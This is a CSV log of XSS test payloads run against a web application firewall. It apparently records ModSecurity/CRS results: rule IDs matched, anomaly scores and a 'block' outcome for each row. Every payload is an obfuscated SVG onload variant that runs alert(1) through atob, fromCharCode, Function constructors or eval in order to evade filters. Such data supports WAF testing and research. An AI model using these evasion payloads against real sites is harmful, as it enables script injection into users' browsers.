2705,"<svg onload=""this.remove();(new Function(('return al'+'ert')))()(1)"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o27,40v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o28,13v217,69 || o28,13v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603599096.318124
2706,"<svg onload=""this.remove();(new Function('return\u0020al'+'ert'))()(1)"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o28,13v217,72 || o28,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603599184.830242
2711,"<svg onload=""this.remove();Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603599780.947529
2713,"<svg onload=""this.remove();(top.Function(atob('YWxlcnQoMSk=')))()"">",0,1,block,5,"932105,941100,941120,941160,949110","o26,5v217,67 || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603600050.539487
2715,"<svg onload=""this.remove();(self['Function'](atob('YWxlcnQoMSk=')))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o27,42v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,71t:urlDecodeUni,t:compressWhitespace || ",25,177603600286.056775
2721,"<svg onload=""this.remove();(false||Function)(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603601063.933042
2722,"<svg onload=""this.remove();with(top)Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603601187.345175
2724,"<svg onload=""this.remove();parent['Function'](atob('YWxlcnQoMSk='))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o33,36v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603601346.900259
2730,"<svg onload=""this.remove();Reflect.construct(Function,[atob('YWxlcnQoMSk=')])()"">",0,1,block,4,"941100,941120,941160,949110","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603602147.815067
2731,"<svg onload=""this.remove();(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603602242.085494
2734,"<svg onload=""this.remove();(new Function(atob('YWxlcnQoMSk')))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603602770.842384
2736,"<svg onload=""this.remove();(new Function('al'+'ert(1)'))()""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o28,13v217,66 || o28,13v217,66t:urlDecodeUni || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603603043.814864
2738,"<svg onload=""this.remove();(new Function(String['fromCharCode'](97,108,101,114,116,40,49,41)))()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o27,69v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o28,13v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603603287.355955
2741,"<svg onload=""this.remove();(new Function(decodeURI('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o28,13v217,90 || o28,13v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603603776.583626
2744,"<svg onload=""this.remove();(new Function(['\141','\154','\145','\162','\164','\50','\61','\51'].join('')))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603604179.303133
2745,"<svg onload=""this.remove();(new Function(unescape(String.fromCharCode(37,54,49,37,54,67,37,54,53,37,55,50,37,55,52,37,50,56,37,51,49,37,50,57))))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,155 || v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760360432.079927
2747,"<svg onload=""this.remove();(new(window.Function)(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o27,46v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603604651.868543
2748,"<svg onload=""this.remove();(new Function(['al','ert','(1',')'].join('')))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603604777.638868
2750,"<svg onload=""this.remove();(new Function(String.fromCodePoint(97,108,101,114,116,40,49,41)))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603604939.779618
2751,"<svg onload=""this.remove();(function(){return Function(atob('YWxlcnQoMSk='))})()()"">",0,1,block,6,"932100,934100,941100,941120,941160,949110","o26,10v217,84 || o28,11v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603605089.237178
2754,"<svg onload=""this.remove();self['Function'](atob('YWxlcnQoMSk='))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o31,36v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,16v217,69t:urlDecodeUni,t:compressWhitespace || ",25,17760360544.223962
2761,"<svg onload=""this.remove();(function(){}['constructor']['constructor'](atob('YWxlcnQoMSk=')))()"">",0,1,block,7,"932100,933210,934100,941100,941120,941160,949110","o26,10v217,97 || o27,68v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o28,11v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760360640.185951
2762,"<svg onload=""this.remove();new Function(atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o27,13v217,65 || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603606567.556498
2763,"<svg onload=""this.remove();function x(){return Function(atob('YWxlcnQoMSk='))()};x()"">",0,1,block,5,"932100,941100,941120,941160,949110","o26,9v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603606640.356801
2764,"<svg onload=""this.remove();(a=Function,a(atob('YWxlcnQoMSk=')))()"">",0,1,block,4,"941100,941120,941160,949110","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603606860.251863
2766,"<svg onload=""this.remove();with(this)Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603607024.003765
2767,"<svg onload=""this.remove();{let{constructor:c}=Function;c(atob('YWxlcnQoMSk='))()}"">",0,1,block,4,"941100,941120,941160,949110","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603607120.885914
2768,"<svg onload=""this['constructor']['constructor']('ale'+'rt(1)')()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,47v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,19v217,72t:urlDecodeUni,t:compressWhitespace || ",25,177603607356.563479
2785,"<svg onload=""self['Function']('\u0061'+'lert'+'\u0028'+'1'+'\u0029')()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,53v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177603609562.516240
2788,"<svg onload='(top[""Function""](""al""+""er""+""t(1)""))()'></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,37v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,15v217,58t:urlDecodeUni,t:compressWhitespace || ",25,177603609870.768772
2795,"<svg onload='(function(){return this})()[""Function""](""al""+""er""+""t(1)"")()'></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,59v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,80 || o14,11v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603610795.618529
2797,"<svg onload='(Function&#x0a;(""al""+""er""+""t(1)""))()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603611051.114777
2808,"<svg onload='(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))})()'></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o22,7v217,91 || o25,58v217,91 || o14,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603612460.532208
2817,"<svg onload='(function(){eval(window[""atob""](""YWxlcnQoMSk=""))})()'></svg>",0,1,block,9,"932100,933160,933210,934100,941100,941120,941160,941370,949110","o22,7v217,73 || o25,40v217,73 || o13,52v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,14v217,73t:urlDecodeUni,t:compressWhitespace || ",40,177603613460.681296
2820,"<svg onload='(function(){self[""eval""](atob(""YWxlcnQoMSk=""))})()'></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o13,50v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,12v217,71t:urlDecodeUni,t:compressWhitespace || ",30,177603613970.983876
2822,"<svg onload='(function(){eval(self[""atob""](""YWxlcnQoMSk=""))})()'></svg>",0,1,block,9,"932100,933160,933210,934100,941100,941120,941160,941370,949110","o22,7v217,71 || o25,38v217,71 || o13,50v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,12v217,71t:urlDecodeUni,t:compressWhitespace || ",40,177603614122.316395
2823,"<svg onload='(function(){this[""eval""](atob(""YWxlcnQoMSk=""))})()'></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o13,50v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,12v217,71t:urlDecodeUni,t:compressWhitespace || ",30,17760361421.813980
2824,"<svg onload='(function(){eval(top[""atob""](""YWxlcnQoMSk=""))})()'></svg>",0,1,block,9,"932100,933160,933210,934100,941100,941120,941160,941370,949110","o22,7v217,70 || o25,37v217,70 || o13,49v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,11v217,70t:urlDecodeUni,t:compressWhitespace || ",40,177603614415.494147
2825,"<svg onload='(function(){(0,eval)(atob(""YWxlcnQoMSk=""))})()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,46v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,67 || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603614525.568193
2826,"<svg onload='(function(){eval(globalThis[""atob""](""YWxlcnQoMSk=""))})()'></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o22,7v217,77 || o25,44v217,77 || o13,56v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603614616.962612
2828,"<svg onload='(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o77,10v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o71,9v217,89t:urlDecodeUni,t:compressWhitespace || ",30,177603614880.506571
2829,"<svg onload='(function(){var a=atob(""YWxlcnQ"");window[a](1)})()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o53,10v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,65 || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,9v217,65t:urlDecodeUni,t:compressWhitespace || ",30,177603615063.607748
2830,"<svg onload='(function(){var a=[][""constructor""][""constructor""](""return this"")()[""al""+""er""+""t""];a(1)})()'>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o31,73v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,106 || o14,11v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603615156.820431
2831,"<svg onload='(function(){var a=self[""a\u006c\u0065\u0072\u0074""];a(1)})()'>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,33v217,75t:urlDecodeUni,t:compressWhitespace || ",25,177603615241.912204
2833,"<svg onload='(function(){var a=top[""ale""+""rt""];a(1)})()'>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,57 || o14,11v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,15v217,57t:urlDecodeUni,t:compressWhitespace || ",30,177603615554.967036
2834,"<svg onload='(function(){var a=parent[String.fromCharCode(97)+String.fromCharCode(108,101,114,116)];a(1)})()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,110 || o14,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603615656.885048
2836,"<svg onload='(function(){var a=this[""al""+""e""+""r""+""t""];a(1)})()'>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,64 || o14,11v217,64t:urlDecodeUni || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,22v217,64t:urlDecodeUni,t:compressWhitespace || ",30,177603615870.383229
